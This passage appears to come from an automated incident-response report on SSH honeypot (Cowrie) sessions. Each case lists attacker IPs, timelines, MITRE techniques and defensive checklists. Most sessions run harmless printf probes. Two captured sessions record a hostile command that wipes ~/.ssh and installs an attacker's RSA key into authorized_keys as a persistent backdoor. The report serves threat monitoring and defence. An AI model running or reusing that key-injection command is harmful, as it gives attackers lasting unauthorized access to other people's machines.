| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4822c8ac3645bea4792c04c181eccebe_small_control'"'"' '"'"'check_4822c8ac3645bea4792c04c181eccebe'"'"'', printf '\n%s|%s\n' 'check_4822c8ac3645bea4792c04c181eccebe_small_control' 'check_4822c8ac3645bea4792c04c181eccebe', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4822c8ac3645bea4792c04c181eccebe_small_math'"'"' "$((521*832+37))"', (521*832+37, printf '\n%s|%s\n' 'check_4822c8ac3645bea4792c04c181eccebe_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:14:08` | `cowrie.session.connect` |
| `2026-11-08 00:14:10` | `cowrie.client.version` |
| `2026-11-08 00:14:10` | `cowrie.client.kex` |
| `2026-11-08 00:14:20` | `cowrie.login.success` |
| `2026-11-08 00:14:26` | `cowrie.client.size` |
| `2026-11-08 00:14:30` | `cowrie.session.params` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| `2026-11-08 00:14:33` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc34bfc5767a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:16 |
| **Last Seen** | 2026-11-08 00:20 |
| **Session Duration** | 257s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_033604af14c229d5ebc578a2406a4939_small_control'"'"' '"'"'check_033604af14c229d5ebc578a2406a4939'"'"'', printf '\n%s|%s\n' 'check_033604af14c229d5ebc578a2406a4939_small_control' 'check_033604af14c229d5ebc578a2406a4939', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_033604af14c229d5ebc578a2406a4939_small_math'"'"' "$((823*209+47))"', (823*209+47, printf '\n%s|%s\n' 'check_033604af14c229d5ebc578a2406a4939_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:16:10` | `cowrie.session.connect` |
| `2026-11-08 00:16:13` | `cowrie.client.version` |
| `2026-11-08 00:16:13` | `cowrie.client.kex` |
| `2026-11-08 00:16:19` | `cowrie.login.success` |
| `2026-11-08 00:16:23` | `cowrie.client.size` |
| `2026-11-08 00:16:26` | `cowrie.session.params` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| `2026-11-08 00:16:28` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eced89212141

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:20 |
| **Last Seen** | 2026-11-08 00:24 |
| **Session Duration** | 252s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e5fc198db0f307853944f55e14c41f84_small_control'"'"' '"'"'check_e5fc198db0f307853944f55e14c41f84'"'"'', printf '\n%s|%s\n' 'check_e5fc198db0f307853944f55e14c41f84_small_control' 'check_e5fc198db0f307853944f55e14c41f84', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e5fc198db0f307853944f55e14c41f84_small_math'"'"' "$((54*596+95))"', (54*596+95, printf '\n%s|%s\n' 'check_e5fc198db0f307853944f55e14c41f84_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:20:28` | `cowrie.session.connect` |
| `2026-11-08 00:20:31` | `cowrie.client.version` |
| `2026-11-08 00:20:31` | `cowrie.client.kex` |
| `2026-11-08 00:20:41` | `cowrie.login.success` |
| `2026-11-08 00:20:45` | `cowrie.client.size` |
| `2026-11-08 00:20:48` | `cowrie.session.params` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| `2026-11-08 00:20:50` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e581b3232466

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:24 |
| **Last Seen** | 2026-11-08 00:28 |
| **Session Duration** | 234s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b178fe86d42d82b3583bd74d4192b7c2_small_control'"'"' '"'"'check_b178fe86d42d82b3583bd74d4192b7c2'"'"'', printf '\n%s|%s\n' 'check_b178fe86d42d82b3583bd74d4192b7c2_small_control' 'check_b178fe86d42d82b3583bd74d4192b7c2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b178fe86d42d82b3583bd74d4192b7c2_small_math'"'"' "$((568*744+37))"', (568*744+37, printf '\n%s|%s\n' 'check_b178fe86d42d82b3583bd74d4192b7c2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:24:41` | `cowrie.session.connect` |
| `2026-11-08 00:24:43` | `cowrie.client.version` |
| `2026-11-08 00:24:43` | `cowrie.client.kex` |
| `2026-11-08 00:24:51` | `cowrie.login.success` |
| `2026-11-08 00:24:55` | `cowrie.client.size` |
| `2026-11-08 00:24:58` | `cowrie.session.params` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| `2026-11-08 00:25:00` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d089c568a5

| Field | Detail |
|---|---|
| **Source IP** | `103.71.176[.]189` |
| **First Seen** | 2026-11-08 00:25 |
| **Last Seen** | 2026-11-08 00:26 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:25:58` | `cowrie.session.connect` |
| `2026-11-08 00:25:58` | `cowrie.client.version` |
| `2026-11-08 00:25:58` | `cowrie.client.kex` |
| `2026-11-08 00:25:59` | `cowrie.login.success` |
| `2026-11-08 00:26:00` | `cowrie.session.params` |
| `2026-11-08 00:26:00` | `cowrie.command.input` |
| `2026-11-08 00:26:00` | `cowrie.command.failed` |
| `2026-11-08 00:26:01` | `cowrie.log.closed` |
| `2026-11-08 00:26:02` | `cowrie.session.params` |
| `2026-11-08 00:26:02` | `cowrie.command.input` |
| `2026-11-08 00:26:02` | `cowrie.session.file_download` |
| `2026-11-08 00:26:02` | `cowrie.log.closed` |
| `2026-11-08 00:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.71.176[.]189` to AbuseIPDB if not already reported
- [ ] Block `103.71.176[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca07c8bb6d3d

| Field | Detail |
|---|---|
| **Source IP** | `103.71.176[.]189` |
| **First Seen** | 2026-11-08 00:26 |
| **Last Seen** | 2026-11-08 00:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:26:02` | `cowrie.session.connect` |
| `2026-11-08 00:26:02` | `cowrie.client.version` |
| `2026-11-08 00:26:02` | `cowrie.client.kex` |
| `2026-11-08 00:26:03` | `cowrie.login.success` |
| `2026-11-08 00:26:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.71.176[.]189` to AbuseIPDB if not already reported
- [ ] Block `103.71.176[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98da0b0528e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:28 |
| **Last Seen** | 2026-11-08 00:31 |
| **Session Duration** | 190s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_16e54479a9876a71a3d6c6a42a5f2e57_small_control'"'"' '"'"'check_16e54479a9876a71a3d6c6a42a5f2e57'"'"'', printf '\n%s|%s\n' 'check_16e54479a9876a71a3d6c6a42a5f2e57_small_control' 'check_16e54479a9876a71a3d6c6a42a5f2e57', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_16e54479a9876a71a3d6c6a42a5f2e57_small_math'"'"' "$((877*683+42))"', (877*683+42, printf '\n%s|%s\n' 'check_16e54479a9876a71a3d6c6a42a5f2e57_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:28:36` | `cowrie.session.connect` |
| `2026-11-08 00:28:37` | `cowrie.client.version` |
| `2026-11-08 00:28:37` | `cowrie.client.kex` |
| `2026-11-08 00:28:44` | `cowrie.login.success` |
| `2026-11-08 00:28:49` | `cowrie.client.size` |
| `2026-11-08 00:28:51` | `cowrie.session.params` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| `2026-11-08 00:28:53` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c9a78feabc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:31 |
| **Last Seen** | 2026-11-08 00:35 |
| **Session Duration** | 218s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e26f105ce05829a8d23ee40fbeb10d95_small_control'"'"' '"'"'check_e26f105ce05829a8d23ee40fbeb10d95'"'"'', printf '\n%s|%s\n' 'check_e26f105ce05829a8d23ee40fbeb10d95_small_control' 'check_e26f105ce05829a8d23ee40fbeb10d95', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e26f105ce05829a8d23ee40fbeb10d95_small_math'"'"' "$((142*225+59))"', (142*225+59, printf '\n%s|%s\n' 'check_e26f105ce05829a8d23ee40fbeb10d95_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:31:46` | `cowrie.session.connect` |
| `2026-11-08 00:31:47` | `cowrie.client.version` |
| `2026-11-08 00:31:47` | `cowrie.client.kex` |
| `2026-11-08 00:31:52` | `cowrie.login.success` |
| `2026-11-08 00:31:55` | `cowrie.client.size` |
| `2026-11-08 00:31:57` | `cowrie.session.params` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| `2026-11-08 00:31:58` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edb4ceff0ee3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:35 |
| **Last Seen** | 2026-11-08 00:39 |
| **Session Duration** | 244s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bc87fcf4e78046abab7ca07df9ac42b5_small_control'"'"' '"'"'check_bc87fcf4e78046abab7ca07df9ac42b5'"'"'', printf '\n%s|%s\n' 'check_bc87fcf4e78046abab7ca07df9ac42b5_small_control' 'check_bc87fcf4e78046abab7ca07df9ac42b5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bc87fcf4e78046abab7ca07df9ac42b5_small_math'"'"' "$((408*342+55))"', (408*342+55, printf '\n%s|%s\n' 'check_bc87fcf4e78046abab7ca07df9ac42b5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:35:25` | `cowrie.session.connect` |
| `2026-11-08 00:35:27` | `cowrie.client.version` |
| `2026-11-08 00:35:27` | `cowrie.client.kex` |
| `2026-11-08 00:35:38` | `cowrie.login.success` |
| `2026-11-08 00:35:43` | `cowrie.client.size` |
| `2026-11-08 00:35:45` | `cowrie.session.params` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| `2026-11-08 00:35:48` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb5bac49d10

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:39 |
| **Last Seen** | 2026-11-08 00:43 |
| **Session Duration** | 210s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_55c494186dcb56ddaf4b449990b56c20_small_control'"'"' '"'"'check_55c494186dcb56ddaf4b449990b56c20'"'"'', printf '\n%s|%s\n' 'check_55c494186dcb56ddaf4b449990b56c20_small_control' 'check_55c494186dcb56ddaf4b449990b56c20', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_55c494186dcb56ddaf4b449990b56c20_small_math'"'"' "$((23*255+35))"', (23*255+35, printf '\n%s|%s\n' 'check_55c494186dcb56ddaf4b449990b56c20_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:39:30` | `cowrie.session.connect` |
| `2026-11-08 00:39:31` | `cowrie.client.version` |
| `2026-11-08 00:39:31` | `cowrie.client.kex` |
| `2026-11-08 00:39:38` | `cowrie.login.success` |
| `2026-11-08 00:39:43` | `cowrie.client.size` |
| `2026-11-08 00:39:44` | `cowrie.session.params` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| `2026-11-08 00:39:46` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705a89b4224a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:43 |
| **Last Seen** | 2026-11-08 00:46 |
| **Session Duration** | 183s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_46843707aa1e7626de87cdcffb9ffb19_small_control'"'"' '"'"'check_46843707aa1e7626de87cdcffb9ffb19'"'"'', printf '\n%s|%s\n' 'check_46843707aa1e7626de87cdcffb9ffb19_small_control' 'check_46843707aa1e7626de87cdcffb9ffb19', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_46843707aa1e7626de87cdcffb9ffb19_small_math'"'"' "$((107*214+11))"', (107*214+11, printf '\n%s|%s\n' 'check_46843707aa1e7626de87cdcffb9ffb19_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:43:00` | `cowrie.session.connect` |
| `2026-11-08 00:43:01` | `cowrie.client.version` |
| `2026-11-08 00:43:01` | `cowrie.client.kex` |
| `2026-11-08 00:43:08` | `cowrie.login.success` |
| `2026-11-08 00:43:12` | `cowrie.client.size` |
| `2026-11-08 00:43:14` | `cowrie.session.params` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| `2026-11-08 00:43:16` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52921164cd3a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:46 |
| **Last Seen** | 2026-11-08 00:48 |
| **Session Duration** | 165s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8428e8d7f4b19760aa7eb3e05f947793_small_control'"'"' '"'"'check_8428e8d7f4b19760aa7eb3e05f947793'"'"'', printf '\n%s|%s\n' 'check_8428e8d7f4b19760aa7eb3e05f947793_small_control' 'check_8428e8d7f4b19760aa7eb3e05f947793', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8428e8d7f4b19760aa7eb3e05f947793_small_math'"'"' "$((932*148+77))"', (932*148+77, printf '\n%s|%s\n' 'check_8428e8d7f4b19760aa7eb3e05f947793_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:46:04` | `cowrie.session.connect` |
| `2026-11-08 00:46:05` | `cowrie.client.version` |
| `2026-11-08 00:46:05` | `cowrie.client.kex` |
| `2026-11-08 00:46:07` | `cowrie.login.success` |
| `2026-11-08 00:46:07` | `cowrie.client.size` |
| `2026-11-08 00:46:08` | `cowrie.session.params` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| `2026-11-08 00:46:08` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-520f188c55b2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-08 00:48 |
| **Last Seen** | 2026-11-08 00:51 |
| **Session Duration** | 174s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6f9eb15d29583f093a52009553c4a3a8_small_control'"'"' '"'"'check_6f9eb15d29583f093a52009553c4a3a8'"'"'', printf '\n%s|%s\n' 'check_6f9eb15d29583f093a52009553c4a3a8_small_control' 'check_6f9eb15d29583f093a52009553c4a3a8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6f9eb15d29583f093a52009553c4a3a8_small_math'"'"' "$((659*811+57))"', (659*811+57, printf '\n%s|%s\n' 'check_6f9eb15d29583f093a52009553c4a3a8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:48:49` | `cowrie.session.connect` |
| `2026-11-08 00:48:51` | `cowrie.client.version` |
| `2026-11-08 00:48:51` | `cowrie.client.kex` |
| `2026-11-08 00:48:57` | `cowrie.login.success` |
| `2026-11-08 00:48:59` | `cowrie.client.size` |
| `2026-11-08 00:49:01` | `cowrie.session.params` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| `2026-11-08 00:49:02` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63fcdb73d40a

| Field | Detail |
|---|---|
| **Source IP** | `141.11.0[.]18` |
| **First Seen** | 2026-11-08 00:51 |
| **Last Seen** | 2026-11-08 00:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-08 00:51:39` | `cowrie.session.connect` |
| `2026-11-08 00:51:39` | `cowrie.client.version` |
| `2026-11-08 00:51:39` | `cowrie.client.kex` |
| `2026-11-08 00:51:39` | `cowrie.login.success` |
| `2026-11-08 00:51:40` | `cowrie.session.params` |
| `2026-11-08 00:51:40` | `cowrie.command.input` |
| `2026-11-08 00:51:40` | `cowrie.command.failed` |
| `2026-11-08 00:51:40` | `cowrie.log.closed` |
| `2026-11-08 00:51:41` | `cowrie.session.params` |
| `2026-11-08 00:51:41` | `cowrie.command.input` |
| `2026-11-08 00:51:41` | `cowrie.session.file_download` |
| `2026-11-08 00:51:41` | `cowrie.log.closed` |
| `2026-11-08 00:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.11.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `141.11.0[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
